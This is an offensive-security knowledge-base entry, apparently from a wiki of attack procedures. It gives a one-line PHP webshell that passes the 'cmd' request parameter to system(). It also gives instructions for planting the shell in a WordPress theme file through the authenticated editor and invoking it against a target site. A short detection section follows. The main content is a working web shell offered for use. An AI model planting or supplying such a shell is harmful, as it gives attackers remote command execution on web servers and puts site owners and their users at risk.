---
id: 841fa9e1-4d76-435f-b0ec-416139cb5c75
type: code
language: php
verified: true
created_at: '2019-10-09T23:27:19.399478+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
  - Linux
tags:
  - webshell
  - rce
  - php
validated: true
---

# PHP-Simple-Web-Shell

## Code

```php
<?php system($_REQUEST["cmd"]); ?>
```

## Description

A minimal PHP webshell that executes system commands passed via the 'cmd' URL parameter, running as the web server user for remote code execution on vulnerable sites like WordPress.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_REQUEST["cmd"] | Command to execute | whoami |

## Usage

Inject into a theme file (e.g., header.php) via authenticated WordPress editor. Access by appending ?cmd=<command> to the page URL, e.g., http://target.com/?cmd=id. Used in RCE upgrades to shells.

## Detection

- Scan for system() calls in PHP files
- Monitor URL parameters for 'cmd' and anomalous executions
- Web logs showing repeated ?cmd= accesses
- File integrity checks on theme directories

## Related

- [[procedures/Add-and-Execute-PHP-Code-on-Authenticated-WordPress-Site]]
- [[procedures/Upgrade-Web-RCE-to-Reverse-Shell-on-Linux]]
